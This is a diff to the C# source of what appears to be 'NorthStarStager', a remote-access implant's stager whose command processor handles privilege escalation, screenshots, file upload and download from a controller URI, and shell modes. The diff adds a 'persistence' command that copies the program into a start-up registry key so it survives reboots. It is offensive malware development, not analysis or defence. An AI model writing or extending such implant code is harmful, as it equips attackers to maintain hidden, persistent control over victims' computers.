@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -21,13 +21,15 @@ namespace NorthStarStager
     {
         initialEnum enumObj;
         privilegeEscalation privs;
+        addPersistence persObj;
         public bool wasScreenshot = false;
         public bool cmdModeEnabled = false;
         public bool powershellModeEnabled = false;
-        public processCommand(initialEnum enumEnv, privilegeEscalation priv)
+        public processCommand(initialEnum enumEnv, privilegeEscalation priv, addPersistence persistenceObj)
         {
             enumObj = enumEnv;
             privs = priv;
+            persObj = persistenceObj;
         }
 
 
@@ -179,9 +181,14 @@ namespace NorthStarStager
 
                 return _uploadAnyFile(argument);
             }
+            else if(command == "pers" || command =="persistence")
+            {
+                return _gainPersistence();
+            }
+                
 
             
-            return "Command not found, you may need to enable CMD mode <enablecmd | enable cmd>";
+            return "Command not found, you may need to enable CMD mode <enablecmd or enable cmd>";
 
         }
 
@@ -469,6 +476,7 @@ namespace NorthStarStager
         */
         public string _downloadFile(string argument)
         {
+
             Uri myUri = new Uri(Globals.fileDownloadUri + argument);
             string fileName = Path.GetTempPath() + System.IO.Path.GetFileName(myUri.LocalPath);
             System.Net.WebClient web = new System.Net.WebClient();
@@ -679,6 +687,16 @@ namespace NorthStarStager
             }
         }
 
+        /*<explanation>
+         * 
+         *Gain persistence via start-up registery key.
+         * </explanation>
+         * */
+         public string _gainPersistence()
+        {
+            return persObj._copyItSelf();
+
+        }
 
  
 
